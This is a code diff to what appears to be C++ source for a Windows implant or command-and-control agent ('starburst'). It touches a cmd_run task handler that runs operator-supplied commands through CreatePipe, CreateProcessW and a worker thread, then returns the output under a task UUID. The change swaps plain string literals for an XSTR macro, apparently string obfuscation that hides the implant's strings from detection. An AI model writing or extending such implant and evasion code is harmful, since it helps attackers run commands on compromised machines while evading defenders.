@@ -58,7 +58,7 @@ static auto WINAPI declfn run_thread_fn( LPVOID param ) -> DWORD {
         inst.heap_free( output );
     } else {
         queue_response( inst, ctx->task_uuid, RESPONSE_SUCCESS,
-            symbol<char*>( const_cast<char*>( "" ) ) );
+            XSTR( "" ) );
     }
 
     inst.heap_free( ctx );
@@ -74,7 +74,7 @@ auto declfn starburst::cmd_run(
     auto cmd_str = parser_string( params, &cmd_len );
     if ( !cmd_str || cmd_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "no command provided" ) ) );
+            XSTR( "no command provided" ) );
         return;
     }
 
@@ -96,7 +96,7 @@ auto declfn starburst::cmd_run(
 
     if ( !inst.kernel32.CreatePipe( &h_read, &h_write, &sa, 0 ) ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CreatePipe failed" ) ) );
+            XSTR( "CreatePipe failed" ) );
         return;
     }
 
@@ -123,7 +123,7 @@ auto declfn starburst::cmd_run(
     if ( !ok ) {
         inst.kernel32.CloseHandle( h_read );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CreateProcessW failed" ) ) );
+            XSTR( "CreateProcessW failed" ) );
         return;
     }
 
@@ -135,7 +135,7 @@ auto declfn starburst::cmd_run(
         inst.kernel32.CloseHandle( pi.hProcess );
         inst.kernel32.CloseHandle( h_read );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
 
@@ -156,7 +156,7 @@ auto declfn starburst::cmd_run(
         inst.kernel32.CloseHandle( h_read );
         inst.heap_free( ctx );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "CreateThread failed" ) ) );
+            XSTR( "CreateThread failed" ) );
         return;
     }
 
